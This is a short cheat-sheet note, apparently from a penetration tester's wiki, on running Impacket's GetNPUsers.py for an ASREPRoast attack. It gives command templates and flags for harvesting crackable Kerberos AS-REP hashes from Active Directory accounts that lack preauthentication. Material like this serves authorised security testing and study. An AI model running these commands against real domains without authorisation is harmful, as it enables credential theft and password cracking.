## Definition
This tool in used to launch the ASREPRoast attack. This script will attempt to list and get TGTs for those users that have the property 'Do not require Kerberos preauthentication' set (UF_DONT_REQUIRE_PREAUTH). For those users with such configuration, a John the Ripper output will be generated so you can send it for cracking.

## Usage
Command to use a list of users or given credentials, perform an LDAP query to obtain users to attack on:
	GETNPUsers.py __{DOMAIN}/__ -usersfile __{WORDLIST}__ -format hashcat -outputfile __{HASH-NAME}__
Request TGTs for users in a file
	GetNPUsers.py -no-pass -usersfile __{USERS-WORDLIST}__ __{DOMAIN}__/

## Useful flags
Flags:
- -k : Use kerberos authentication
- -no-pass : Don't ask for password (Useful for -k)
- -usersfile __{USERS_WORDLIST}__ : File with user per line to test
- -format __{hashcat, john}__ : Format to save the AS_REQ of users without pre-authentication
- -outputfile __{FILENAME}__ : Output filename
- -request : Requests TGT for users and output them in JtR/hashcat format
- -dc-ip __{IP-ADDR}__ : IP address of the [[Domain controller (DC)]]. If ommited it use the domain part specified in the target parameter
- -dc-host __{HOSTNAME}__ : Hostname of the [[Domain controller (DC)]] to use. If ommited, the domain part specified in the account parameter will be used